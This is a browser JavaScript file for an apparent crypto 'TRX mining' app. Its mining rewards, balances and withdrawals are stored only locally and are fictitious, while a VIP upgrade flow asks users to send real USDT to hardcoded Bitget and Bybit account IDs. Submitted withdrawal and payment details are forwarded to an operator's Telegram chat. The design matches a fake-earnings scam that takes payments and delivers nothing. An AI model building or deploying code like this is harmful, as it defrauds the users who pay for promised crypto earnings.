/* ========== CONFIG ========== */
const TELEGRAM_BOT_TOKEN = ""; // put your real bot token here later
const ADMIN_CHAT_ID = "7417215529"; // admin chat id provided

/* ========== CONSTANTS ========== */
const TRX_PRICE_USDT = 0.0006;      // requested price
const REWARD_TRX = 5;
const MINING_DURATION_MS = 2 * 60 * 60 * 1000; // 2 hours
const STORAGE_KEY = 'trx_advanced_v1';

/* ========== Helpers ========== */
function loadState(){
  try{ const j = localStorage.getItem(STORAGE_KEY); return j ? JSON.parse(j) : null; } catch(e){ return null; }
}
function saveState(s){ localStorage.setItem(STORAGE_KEY, JSON.stringify(s)); }
function formatSecondsToHMS(sec){
  const h = Math.floor(sec/3600), m = Math.floor((sec%3600)/60), s = Math.floor(sec%60);
  return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
}

/* ========== Initial State ========== */
let state = loadState() || {
  trx: 20,
  usdt: 20 * TRX_PRICE_USDT,
  teamCount: 0,
  miningActive: false,
  miningEnd: null,
  miningHistory: [],
  withdrawRequests: [],
  vipRequests: [],
  refCode: (Math.random().toString(36).slice(2,8)).toUpperCase()
};
saveState(state);

/* ========== DOM Refs ========== */
const pages = Array.from(document.querySelectorAll('.page'));
const navBtns = Array.from(document.querySelectorAll('.nav-btn'));
const refCodeEl = document.getElementById('refCode');
const copyRefBtn = document.getElementById('copyRefBtn');

const trxAmount = document.getElementById('trxAmount');
const usdtAmount = document.getElementById('usdtAmount');
const mineActionBtn = document.getElementById('mineActionBtn');
const mineStatus = document.getElementById('mineStatus');
const progressInner = document.getElementById('progressInner');
const progressTimer = document.getElementById('progressTimer');
const mineMessage = document.getElementById('mineMessage');
const miningHistoryEl = document.getElementById('miningHistory');
const teamCountEl = document.getElementById('teamCount');
const priceLabel = document.getElementById('priceLabel');

const convertInput = document.getElementById('convertInput');
const convertDo = document.getElementById('convertDo');
const convertResult = document.getElementById('convertResult');

const withdrawMethod = document.getElementById('withdrawMethod');
const withdrawUID = document.getElementById('withdrawUID');
const withdrawAmount = document.getElementById('withdrawAmount');
const submitWithdraw = document.getElementById('submitWithdraw');
const withdrawMsg = document.getElementById('withdrawMsg');

const buyVipBtns = Array.from(document.querySelectorAll('.buyVipBtn'));
const vipForm = document.getElementById('vipForm');
const vipFormTitle = document.getElementById('vipFormTitle');
const vipExchange = document.getElementById('vipExchange');
const vipSenderUID = document.getElementById('vipSenderUID');
const vipMemo = document.getElementById('vipMemo');
const vipFile = document.getElementById('vipFile');
const vipSubmit = document.getElementById('vipSubmit');
const vipCancel = document.getElementById('vipCancel');
const vipMsg = document.getElementById('vipMsg');
const bitgetUID = document.getElementById('bitgetUID');
const bybitUID = document.getElementById('bybitUID');

bitgetUID && (bitgetUID.innerText = '9879164714');
bybitUID && (bybitUID.innerText = '269645993');

/* ========== Navigation ========== */
navBtns.forEach(btn=>{
  btn.addEventListener('click', ()=>{
    navBtns.forEach(b=>b.classList.remove('active'));
    btn.classList.add('active');
    const target = btn.dataset.target;
    pages.forEach(p=>p.classList.remove('active'));
    document.getElementById(`page-${target}`) ? document.getElementById(`page-${target}`).classList.add('active') : document.getElementById(target).classList.add('active');
  });
});

/* ========== Referral display ========== */
refCodeEl.innerText = state.refCode;
copyRefBtn.addEventListener('click', ()=>{
  navigator.clipboard.writeText(state.refCode).then(()=>alert('Referral code copied'));
});

/* ========== Render UI ========== */
let miningInterval = null;
function renderAll(){
  trxAmount.innerText = state.trx.toFixed(6) + ' TRX';
  usdtAmount.innerText = parseFloat(state.usdt).toFixed(6) + ' USDT';
  priceLabel && (priceLabel.innerText = TRX_PRICE_USDT.toString());
  teamCountEl && (teamCountEl.innerText = state.teamCount);
  // history
  miningHistoryEl.innerHTML = '';
  (state.miningHistory || []).slice().reverse().forEach(h=>{
    const li = document.createElement('li');
    li.innerText = `${h.text} — ${new Date(h.time).toLocaleString()}`;
    miningHistoryEl.appendChild(li);
  });
  renderMiningUI();
  saveState(state);
}

/* ========== Mining logic (persistent) ========== */
function renderMiningUI(){
  if(state.miningActive && state.miningEnd){
    const remaining = Math.max(0, state.miningEnd - Date.now());
    if(remaining <= 0){
      progressInner.style.width = '100%';
      progressTimer.innerText = 'Ready to claim';
      mineActionBtn.innerText = `Collect (${REWARD_TRX} TRX)`;
      mineActionBtn.disabled = false;
      mineStatus.innerText = 'Completed';
      mineActionBtn.onclick = collectReward;
      if(miningInterval){ clearInterval(miningInterval); miningInterval = null; }
      toggleCoinAnimation(false);
    } else {
      const pct = Math.max(0, Math.min(100, ((MINING_DURATION_MS - remaining) / MINING_DURATION_MS) * 100));
      progressInner.style.width = pct + '%';
      progressTimer.innerText = `Time: ${formatSecondsToHMS(Math.floor(remaining/1000))}`;
      mineActionBtn.innerText = 'Mining...';
      mineActionBtn.disabled = true;
      mineStatus.innerText = 'Mining';
      mineActionBtn.onclick = null;
      if(!miningInterval){
        miningInterval = setInterval(renderMiningUI, 1000);
      }
      toggleCoinAnimation(true);
    }
  } else {
    progressInner.style.width = '0%';
    progressTimer.innerText = 'Not started';
    mineActionBtn.innerText = 'Start Mining';
    mineActionBtn.disabled = false;
    mineStatus.innerText = 'Idle';
    mineActionBtn.onclick = startMining;
    if(miningInterval){ clearInterval(miningInterval); miningInterval = null; }
    toggleCoinAnimation(false);
  }
}

/* coin animation toggler (adds/removes CSS class) */
function toggleCoinAnimation(on){
  const coin = document.querySelector('.coin-outer');
  if(!coin) return;
  if(on) coin.classList.add('spin-active'); else coin.classList.remove('spin-active');
}

/* start / collect */
function startMining(){
  if(state.miningActive) return;
  state.miningActive = true;
  state.miningEnd = Date.now() + MINING_DURATION_MS;
  state.miningStart = Date.now();
  state.miningHistory = state.miningHistory || [];
  state.miningHistory.push({ text: 'Mining started', time: Date.now() });
  mineMessage.innerText = 'Mining started — progress will resume after refresh';
  renderAll();
}

function collectReward(){
  state.miningActive = false;
  state.miningEnd = null;
  state.trx = parseFloat((state.trx + REWARD_TRX).toFixed(6));
  state.usdt = parseFloat((state.trx * TRX_PRICE_USDT).toFixed(6));
  state.miningHistory = state.miningHistory || [];
  state.miningHistory.push({ text: `Collected +${REWARD_TRX} TRX`, time: Date.now() });
  mineMessage.innerText = `Collected ${REWARD_TRX} TRX`;
  sendTelegram(`[CLAIM] Ref:${state.refCode} +${REWARD_TRX} TRX`);
  renderAll();
}

/* ========== Convert TRX -> USDT ========== */
convertDo && convertDo.addEventListener('click', ()=>{
  const v = parseFloat(convertInput.value || 0);
  if(!v || v <= 0){ alert('Enter TRX amount'); return; }
  if(v > state.trx){ alert('Not enough TRX'); return; }
  const converted = v * TRX_PRICE_USDT;
  state.trx = parseFloat((state.trx - v).toFixed(6));
  state.usdt = parseFloat((state.usdt + converted).toFixed(6));
  state.miningHistory = state.miningHistory || [];
  state.miningHistory.push({ text: `Converted ${v} TRX`, time: Date.now() });
  convertResult.innerText = `Converted ${v} TRX → ${converted.toFixed(6)} USDT`;
  sendTelegram(`[CONVERT] Ref:${state.refCode} ${v} TRX → ${converted.toFixed(6)} USDT`);
  renderAll();
});

/* ========== Withdraw ========== */
submitWithdraw && submitWithdraw.addEventListener('click', ()=>{
  const method = withdrawMethod.value;
  const uid = withdrawUID.value.trim();
  const amount = parseFloat(withdrawAmount.value || 0);
  if(!uid){ alert('Enter UID'); return; }
  if(isNaN(amount) || amount < 0.01){ alert('Amount must be >= 0.01'); return; }
  if(amount > state.usdt){ alert('Not enough USDT'); return; }
  state.usdt = parseFloat((state.usdt - amount).toFixed(6));
  state.withdrawRequests = state.withdrawRequests || [];
  const req = { ref: state.refCode, method, uid, amount, time: Date.now() };
  state.withdrawRequests.push(req);
  withdrawMsg.innerText = `Withdraw ${amount.toFixed(6)} USDT to ${method} (${uid}) — request sent`;
  sendTelegram(`[WITHDRAW] Ref:${state.refCode} Method:${method} UID:${uid} Amount:${amount.toFixed(6)} USDT`);
  renderAll();
});

/* ========== Team (ref only) ========== */
document.getElementById('refCode') && (document.getElementById('refCode').innerText = state.refCode);
document.getElementById('copyRefBtn') && document.getElementById('copyRefBtn').addEventListener('click', ()=>{ navigator.clipboard.writeText(state.refCode); alert('Copied referral code'); });

/* ========== VIP flow ========== */
let selectedPlan = null;
buyVipBtns.forEach(b=>{
  b.addEventListener('click', ()=>{
    selectedPlan = b.closest('.vip-card').dataset.plan;
    vipForm.classList.remove('hidden');
    vipFormTitle.innerText = (selectedPlan === 'vip1' ? 'VIP 1 — 0.10 USDT' : 'VIP 2 — 0.20 USDT');
    vipMsg.innerText = `Send ${selectedPlan==='vip1' ? '0.10' : '0.20'} USDT to Bitget (9879164714) or Bybit (269645993), then upload proof.`;
  });
});
vipCancel && vipCancel.addEventListener('click', ()=>{
  vipForm.classList.add('hidden'); selectedPlan = null; vipMsg.innerText = '';
});
vipSubmit && vipSubmit.addEventListener('click', ()=>{
  const exch = vipExchange.value;
  const sender = vipSenderUID.value.trim();
  const memo = vipMemo.value.trim();
  const file = vipFile.files[0];
  if(!selectedPlan){ alert('Choose plan'); return; }
  if(!sender || !memo){ alert('Enter sender UID and memo'); return; }
  state.vipRequests = state.vipRequests || [];
  const req = { plan:selectedPlan, ref:state.refCode, exchange:exch, sender, memo, time: Date.now() };
  state.vipRequests.push(req);
  vipMsg.innerText = 'VIP request submitted. Admin will review within 24h.';
  if(file){
    const reader = new FileReader();
    reader.onload = e => { state[`vip_proof_${Date.now()}`] = e.target.result; saveState(state); };
    reader.readAsDataURL(file);
  }
  sendTelegram(`[VIP REQUEST] Plan:${selectedPlan} Ref:${state.refCode} Exchange:${exch} Sender:${sender} Memo:${memo}`);
  vipForm.classList.add('hidden'); selectedPlan = null;
  renderAll();
});

/* ========== Telegram send helper ========== */
function sendTelegram(text){
  if(!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID) { console.log('TG disabled ->', text); return; }
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method:'POST', headers:{ 'Content-Type':'application/json' },
    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text })
  }).then(r=>r.json()).then(j=>console.log('tg ok', j)).catch(e=>console.error('tg err', e));
}

/* ========== Coin spin CSS add (runtime) ========== */
(function addSpinCSS(){
  const css = `.coin-outer.spin-active{animation: spinCoin 3s linear infinite; box-shadow:0 20px 60px rgba(0,255,150,0.06);} @keyframes spinCoin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}`;
  const s = document.createElement('style'); s.innerText = css; document.head.appendChild(s);
})();

/* ========== Init ========== */
(function init(){
  // keep numeric
  state.trx = parseFloat(state.trx);
  state.usdt = parseFloat(state.usdt);
  // resume mining if needed
  if(state.miningActive && state.miningEnd && Date.now() < state.miningEnd){
    // continue
  } else {
    if(state.miningEnd && Date.now() >= state.miningEnd){
      // expired but not claimed -> mark ready (user must claim)
      state.miningActive = false;
      state.miningEnd = null;
    }
  }
  renderAll();
})();
